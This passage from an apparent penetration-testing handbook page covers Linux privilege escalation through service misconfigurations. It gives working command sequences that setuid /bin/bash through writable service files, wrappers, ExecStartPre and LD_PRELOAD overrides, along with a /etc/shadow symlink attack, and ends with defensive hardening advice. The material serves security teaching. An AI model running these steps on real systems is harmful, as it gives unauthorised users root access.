+<h4 id="c-systemd-s-bindreadonlypaths-bindpaths">C. Systemd's <code>BindReadOnlyPaths</code> / <code>BindPaths</code><a aria-label="Link to this section" class="g-anchor" href="#c-systemd-s-bindreadonlypaths-bindpaths">#</a></h4>
+<p>If a service mounts directories, you might be able to write to them.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check mounts</span>
+systemctl<span class="w"> </span>show<span class="w"> </span>service_name<span class="w"> </span>-p<span class="w"> </span>BindReadOnlyPaths<span class="w"> </span>-p<span class="w"> </span>BindPaths
+
+<span class="c1"># If /etc is mounted read-write, you can modify system files</span>
+</code></pre></div>
+<hr/>
+<h3 id="7-service-file-inclusion-import">7. Service File Inclusion/Import<a aria-label="Link to this section" class="g-anchor" href="#7-service-file-inclusion-import">#</a></h3>
+<p>Some services include other configuration files or scripts.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Find services that include files</span>
+grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">"Include\|Import\|Source"</span><span class="w"> </span>/etc/systemd/system/*.service<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">"\. "</span><span class="w"> </span>/etc/init.d/*<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># 2. If included directory is writable</span>
+<span class="c1"># Example: service includes /etc/service.d/*.conf</span>
+<span class="c1"># And /etc/service.d/ is writable</span>
+
+<span class="c1"># 3. Create malicious config</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">chmod +s /bin/bash'</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/service.d/backdoor.conf
+
+<span class="c1"># 4. Restart service</span>
+systemctl<span class="w"> </span>restart<span class="w"> </span>service
+</code></pre></div>
+<hr/>
+<h3 id="8-service-dependencies">8. Service Dependencies<a aria-label="Link to this section" class="g-anchor" href="#8-service-dependencies">#</a></h3>
+<p>Services can have dependencies that execute when they start/stop.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Check service dependencies</span>
+systemctl<span class="w"> </span>list-dependencies<span class="w"> </span>service_name
+
+<span class="c1"># 2. Find writable dependency</span>
+find<span class="w"> </span>/etc/systemd/system<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.service"</span><span class="w"> </span>-writable<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">"dependency|target"</span>
+
+<span class="c1"># 3. Modify dependency to include backdoor</span>
+<span class="c1"># Wait for original service to start/restart</span>
+</code></pre></div>
+<hr/>
+<h3 id="9-inetd-xinetd-wrapper-scripts">9. Inetd / Xinetd Wrapper Scripts<a aria-label="Link to this section" class="g-anchor" href="#9-inetd-xinetd-wrapper-scripts">#</a></h3>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Find wrapper scripts in xinetd configs</span>
+grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">"server"</span><span class="w"> </span>/etc/xinetd.d/*<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"/usr\|/bin\|/sbin"</span>
+
+<span class="c1"># 2. If wrapper script is writable</span>
+vim<span class="w"> </span>/etc/xinetd.d/myservice
+<span class="c1"># Contains: server = /usr/local/bin/myservice_wrapper</span>
+
+<span class="c1"># 3. Modify wrapper</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">chmod +s /bin/bash</span>
+<span class="s1">/usr/bin/real_service'</span><span class="w"> </span>&gt;<span class="w"> </span>/usr/local/bin/myservice_wrapper
+chmod<span class="w"> </span>+x<span class="w"> </span>/usr/local/bin/myservice_wrapper
+
+<span class="c1"># 4. Connect to service to trigger</span>
+nc<span class="w"> </span>localhost<span class="w"> </span>&lt;port&gt;
+</code></pre></div>
+<hr/>
+<h3 id="10-service-socket-activation">10. Service Socket Activation<a aria-label="Link to this section" class="g-anchor" href="#10-service-socket-activation">#</a></h3>
+<p>Systemd socket-activated services start on demand when a connection is received.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Find socket-activated services</span>
+systemctl<span class="w"> </span>list-units<span class="w"> </span>--type<span class="o">=</span>socket<span class="w"> </span>--state<span class="o">=</span>running
+
+<span class="c1"># 2. Check service and socket configuration</span>
+systemctl<span class="w"> </span>cat<span class="w"> </span>service_name.socket
+systemctl<span class="w"> </span>cat<span class="w"> </span>service_name.service
+
+<span class="c1"># 3. If service file is writable, modify it</span>
+<span class="c1"># 4. Restart socket</span>
+systemctl<span class="w"> </span>restart<span class="w"> </span>service_name.socket
+
+<span class="c1"># 5. Trigger by connecting to socket</span>
+nc<span class="w"> </span>localhost<span class="w"> </span>&lt;port&gt;
+</code></pre></div>
+<hr/>
+<h3 id="11-service-temporary-files">11. Service Temporary Files<a aria-label="Link to this section" class="g-anchor" href="#11-service-temporary-files">#</a></h3>
+<p>Services often create temporary files in <code>/tmp</code> or <code>/var/tmp</code>.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Monitor service's temporary file creation</span>
+strace<span class="w"> </span>-e<span class="w"> </span>openat<span class="w"> </span>-p<span class="w"> </span>&lt;service_pid&gt;<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">"/tmp|/var/tmp"</span>
+
+<span class="c1"># 2. Create symlink to sensitive file</span>
+ln<span class="w"> </span>-s<span class="w"> </span>/etc/shadow<span class="w"> </span>/tmp/service_temp_file
+
+<span class="c1"># 3. Wait for service to write to it (TOCTOU)</span>
+<span class="c1"># If service is root, it overwrites /etc/shadow</span>
+</code></pre></div>
+<hr/>
+<h3 id="12-practical-exploitation-workflow">12. Practical Exploitation Workflow<a aria-label="Link to this section" class="g-anchor" href="#12-practical-exploitation-workflow">#</a></h3>
+<p><strong>Step 1: Enumerate Services</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># All running services</span>
+systemctl<span class="w"> </span>list-units<span class="w"> </span>--type<span class="o">=</span>service<span class="w"> </span>--state<span class="o">=</span>running<span class="w"> </span>--no-legend
+
+<span class="c1"># Check each service's configuration</span>
+<span class="k">for</span><span class="w"> </span>service<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>systemctl<span class="w"> </span>list-units<span class="w"> </span>--type<span class="o">=</span>service<span class="w"> </span>--state<span class="o">=</span>running<span class="w"> </span>--no-legend<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $1}'</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"=== </span><span class="nv">$service</span><span class="s2"> ==="</span>
+<span class="w">    </span>systemctl<span class="w"> </span>cat<span class="w"> </span><span class="nv">$service</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+<span class="w">    </span><span class="nb">echo</span>
+<span class="k">done</span>
+</code></pre></div>
+<p><strong>Step 2: Check Permissions</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check service files</span>
+find<span class="w"> </span>/etc/systemd/system<span class="w"> </span>/lib/systemd/system<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.service"</span><span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+find<span class="w"> </span>/etc/init.d<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Check service binaries</span>
+<span class="k">for</span><span class="w"> </span>service<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>systemctl<span class="w"> </span>list-units<span class="w"> </span>--type<span class="o">=</span>service<span class="w"> </span>--state<span class="o">=</span>running<span class="w"> </span>--no-legend<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $1}'</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="nv">binary</span><span class="o">=</span><span class="k">$(</span>systemctl<span class="w"> </span>show<span class="w"> </span><span class="nv">$service</span><span class="w"> </span>-p<span class="w"> </span>ExecStart<span class="w"> </span>--no-pager<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="o">=</span><span class="w"> </span>-f2<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $1}'</span><span class="k">)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">"</span><span class="nv">$binary</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-f<span class="w"> </span><span class="s2">"</span><span class="nv">$binary</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">"</span><span class="nv">$binary</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"[!] Writable binary: </span><span class="nv">$binary</span><span class="s2"> (</span><span class="nv">$service</span><span class="s2">)"</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="k">done</span>
+</code></pre></div>
+<p><strong>Step 3: Identify Best Target</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Look for services that:</span>
+<span class="c1"># 1. Run as root (User=root)</span>
+<span class="c1"># 2. Have writable configuration files</span>
+<span class="c1"># 3. Have writable binaries</span>
+<span class="c1"># 4. Have dangerous options</span>
+<span class="c1"># 5. Are commonly used and unlikely to be removed</span>
+</code></pre></div>
+<p><strong>Step 4: Create Exploit</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Option A: Modify service file</span>
+vim<span class="w"> </span>/etc/systemd/system/target.service
+<span class="c1"># Add: ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'</span>
+
+<span class="c1"># Option B: Replace binary</span>
+cp<span class="w"> </span>/tmp/backdoor<span class="w"> </span>/usr/bin/target_binary
+
+<span class="c1"># Option C: Environment variable</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/etc/systemd/system/target.service.d/override.conf<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">[Service]</span>
+<span class="s">Environment="LD_PRELOAD=/tmp/backdoor.so"</span>
+<span class="s">EOF</span>
+</code></pre></div>
+<p><strong>Step 5: Trigger Execution</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Systemd</span>
+systemctl<span class="w"> </span>daemon-reload
+systemctl<span class="w"> </span>restart<span class="w"> </span>target_service
+
+<span class="c1"># SysV</span>
+service<span class="w"> </span>target_service<span class="w"> </span>restart
+
+<span class="c1"># xinetd</span>
+systemctl<span class="w"> </span>restart<span class="w"> </span>xinetd
+<span class="c1"># Then connect to the port</span>
+</code></pre></div>
+<p><strong>Step 6: Verify</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">ls<span class="w"> </span>-la<span class="w"> </span>/bin/bash
+<span class="c1"># -rwsr-sr-x 1 root root ...</span>
+/bin/bash<span class="w"> </span>-p
+<span class="c1"># root shell</span>
+</code></pre></div>
+<hr/>
+<h3 id="13-defensive-measures">13. Defensive Measures<a aria-label="Link to this section" class="g-anchor" href="#13-defensive-measures">#</a></h3>
+<p><strong>For System Administrators</strong>:</p>
+<ol>
+<li>
+<p><strong>Restrict Service File Permissions</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Protect systemd service files</span>
+chmod<span class="w"> </span><span class="m">644</span><span class="w"> </span>/etc/systemd/system/*.service
+chown<span class="w"> </span>root:root<span class="w"> </span>/etc/systemd/system/*.service
+
+<span class="c1"># Protect init scripts</span>
+chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/etc/init.d/*
+chown<span class="w"> </span>root:root<span class="w"> </span>/etc/init.d/*
+</code></pre></div>
+</li>
+<li>
+<p><strong>Use Systemd Security Features</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># In service file:</span>
+<span class="o">[</span>Service<span class="o">]</span>
+<span class="nv">User</span><span class="o">=</span>nobody
+<span class="nv">Group</span><span class="o">=</span>nogroup
+<span class="nv">ProtectSystem</span><span class="o">=</span>strict
+<span class="nv">PrivateTmp</span><span class="o">=</span>yes
+<span class="nv">NoNewPrivileges</span><span class="o">=</span>yes
+<span class="nv">PrivateDevices</span><span class="o">=</span>yes
+<span class="nv">ProtectHome</span><span class="o">=</span>yes
+<span class="nv">ProtectKernelTunables</span><span class="o">=</span>yes
+<span class="nv">ProtectKernelModules</span><span class="o">=</span>yes
+<span class="nv">ProtectControlGroups</span><span class="o">=</span>yes
+<span class="nv">RestrictRealtime</span><span class="o">=</span>yes
+</code></pre></div>
+</li>
+<li>
+<p><strong>Minimize Root Services</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Run services as non-root users</span>
+<span class="nv">User</span><span class="o">=</span>www-data
+<span class="nv">Group</span><span class="o">=</span>www-data
+<span class="c1"># Only grant necessary capabilities</span>
+<span class="nv">AmbientCapabilities</span><span class="o">=</span>CAP_NET_BIND_SERVICE
+<span class="nv">CapabilityBoundingSet</span><span class="o">=</span>CAP_NET_BIND_SERVICE
+</code></pre></div>
+</li>
+<li>
+<p><strong>Use Read-Only Filesystems</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Mount /usr as read-only</span>
+mount<span class="w"> </span>-o<span class="w"> </span>remount,ro<span class="w"> </span>/usr
+<span class="c1"># Or use overlayfs for writable layers</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Monitor Service Changes</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Audit service file changes</span>
+auditctl<span class="w"> </span>-w<span class="w"> </span>/etc/systemd/system/<span class="w"> </span>-p<span class="w"> </span>wa<span class="w"> </span>-k<span class="w"> </span>systemd_changes
+auditctl<span class="w"> </span>-w<span class="w"> </span>/etc/init.d/<span class="w"> </span>-p<span class="w"> </span>wa<span class="w"> </span>-k<span class="w"> </span>init_changes
+
+<span class="c1"># Check service file integrity</span>
+<span class="k">for</span><span class="w"> </span>file<span class="w"> </span><span class="k">in</span><span class="w"> </span>/etc/systemd/system/*.service<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span>sha256sum<span class="w"> </span><span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/var/log/service_checksums
+<span class="k">done</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Regular Audits</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check for writable service files daily</span>
+find<span class="w"> </span>/etc/systemd/system<span class="w"> </span>/lib/systemd/system<span class="w"> </span>/etc/init.d<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span>!<span class="w"> </span>-user<span class="w"> </span>root<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Check service binaries</span>
+<span class="k">for</span><span class="w"> </span>service<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>systemctl<span class="w"> </span>list-units<span class="w"> </span>--type<span class="o">=</span>service<span class="w"> </span>--state<span class="o">=</span>running<span class="w"> </span>--no-legend<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $1}'</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="nv">binary</span><span class="o">=</span><span class="k">$(</span>systemctl<span class="w"> </span>show<span class="w"> </span><span class="nv">$service</span><span class="w"> </span>-p<span class="w"> </span>ExecStart<span class="w"> </span>--no-pager<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="o">=</span><span class="w"> </span>-f2<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $1}'</span><span class="k">)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-f<span class="w"> </span><span class="s2">"</span><span class="nv">$binary</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>!<span class="w"> </span>-O<span class="w"> </span><span class="s2">"</span><span class="nv">$binary</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Warning: </span><span class="nv">$binary</span><span class="s2"> not owned by root"</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="k">done</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Use AppArmor/SELinux</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Restrict service capabilities</span>
+<span class="c1"># Create profiles for critical services</span>
+aa-enforce<span class="w"> </span>/etc/apparmor.d/usr.sbin.mysqld
+</code></pre></div>
+</li>
+<li>
+<p><strong>Service Hardening Checklist</strong>:</p>
+<ul>
+<li>[ ] All service files owned by root:root</li>
+<li>[ ] Service files not writable by group/others (chmod 644)</li>
+<li>[ ] Services run as least-privileged user</li>
+<li>[ ] ProtectSystem and PrivateTmp enabled</li>
+<li>[ ] NoNewPrivileges enabled</li>
+<li>[ ] Proper CapabilityBoundingSet</li>
+<li>[ ] Read-only filesystems where possible</li>
+<li>[ ] Regular integrity checks</li>
+</ul>
+</li>
+</ol>
+</div>
+      <p class="g-source-note">Privilege Escalation handbook: Part 09 of 10. Adapted from <a href="https://github.com/JoramMalley/Linux-privilege-escalation" target="_blank" rel="noopener noreferrer">JoramMalley's Linux privilege escalation notes</a> and corrected where public advisories differ. Verify every version, CVE and command against vendor documentation. Use only in labs, CTFs or systems you own and have written permission to test.</p>
+      <div class="g-foundation-cta">
+        <div>
+          <p class="g-kicker">Apply it</p>
+          <strong>Automate the enumeration.</strong>
+          <p>Chapter 26 turns these checks into a repeatable collection and validation pass.</p>
+        </div>
+        <a class="g-btn primary" href="../chapters/26-automating-linux-privilege-escalation-checks.html">
+          Open Chapter 26 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m13 6 6 6-6 6"/></svg>
+        </a>
+      </div>
+      <nav class="g-chapter-nav" aria-label="Privilege escalation navigation"><a class="g-chapter-card" href="../privesc/08-kernel-exploits.html" data-prev-privesc><span class="g-chapter-card-label">Previous / Part 08</span><strong>Kernel Exploits</strong></a><a class="g-chapter-card" href="../privesc/10-nfs-misconfigurations.html" data-next-privesc><span class="g-chapter-card-label">Next / Part 10</span><strong>NFS Misconfigurations</strong></a></nav>
+    </article>
+  </main>
+  
+<aside class="g-toc" aria-label="On this page">
+  <div class="g-toc-inner">
+    <p class="g-toc-kicker">On this page</p>
+    <nav class="g-toc-nav"><a class="g-toc-link depth-2" href="#service-misconfigurations-for-privilege-escalation" data-toc-link>Service Misconfigurations for Privilege Escalation</a><a class="g-toc-link depth-3" href="#1-understanding-service-misconfigurations" data-toc-link>1. Understanding Service Misconfigurations</a><a class="g-toc-link depth-3" href="#2-enumeration-finding-vulnerable-services" data-toc-link>2. Enumeration: Finding Vulnerable Services</a><a class="g-toc-link depth-3" href="#3-writable-service-binaries" data-toc-link>3. Writable Service Binaries</a><a class="g-toc-link depth-3" href="#4-writable-service-configuration-files" data-toc-link>4. Writable Service Configuration Files</a><a class="g-toc-link depth-3" href="#5-service-user-misconfigurations" data-toc-link>5. Service User Misconfigurations</a><a class="g-toc-link depth-3" href="#6-dangerous-service-options" data-toc-link>6. Dangerous Service Options</a><a class="g-toc-link depth-3" href="#7-service-file-inclusion-import" data-toc-link>7. Service File Inclusion/Import</a><a class="g-toc-link depth-3" href="#8-service-dependencies" data-toc-link>8. Service Dependencies</a><a class="g-toc-link depth-3" href="#9-inetd-xinetd-wrapper-scripts" data-toc-link>9. Inetd / Xinetd Wrapper Scripts</a><a class="g-toc-link depth-3" href="#10-service-socket-activation" data-toc-link>10. Service Socket Activation</a><a class="g-toc-link depth-3" href="#11-service-temporary-files" data-toc-link>11. Service Temporary Files</a><a class="g-toc-link depth-3" href="#12-practical-exploitation-workflow" data-toc-link>12. Practical Exploitation Workflow</a><a class="g-toc-link depth-3" href="#13-defensive-measures" data-toc-link>13. Defensive Measures</a></nav>
+    <div class="g-toc-foot">Part 09 / 14 sections</div>
+  </div>
+</aside>
+</div>
+<footer class="g-site-foot g-docs-foot">
+  <div class="g-foot-main">
+    <span>0XMAP field guide / 30 chapters / 2 companion handbooks</span>
+    <span>Created by 0xbit</span>
+  </div>
+  <div class="g-foot-links">
+    <a href="../index.html">Home</a>
+    <a href="../index.html#foundations">Foundations</a>
+    <a href="../index.html#privesc">Privilege escalation</a>
+    <a href="../index.html#chapters">Chapters</a>
+    <button type="button" class="g-link-btn" data-search-open>Search</button>
+  </div>
+</footer>
+  
+<div class="g-search" data-search-modal hidden>
+  <div class="g-search-panel" role="dialog" aria-modal="true" aria-labelledby="g-search-title">
+    <div class="g-search-top">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+      <label class="g-visually-hidden" for="g-search-input" id="g-search-title">Search the guide</label>
+      <input class="g-search-input" id="g-search-input" data-search-input type="search"
+             placeholder="Search chapters, handbooks and commands..." autocomplete="off" spellcheck="false">
+      <kbd>Esc</kbd>
+      <button type="button" class="g-icon-btn" data-search-close aria-label="Close search">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+      </button>
+    </div>
+    <div class="g-search-results" data-search-results></div>
+    <div class="g-search-foot">
+      <span><kbd>Up</kbd><kbd>Down</kbd> to move</span>
+      <span><kbd>Enter</kbd> to open</span>
+      <span data-search-count></span>
+    </div>
+  </div>
+</div>
+  <script src="../static/guide-data.js"></script>
+  <script src="../static/guide.js" defer></script>
+</body>
+</html>
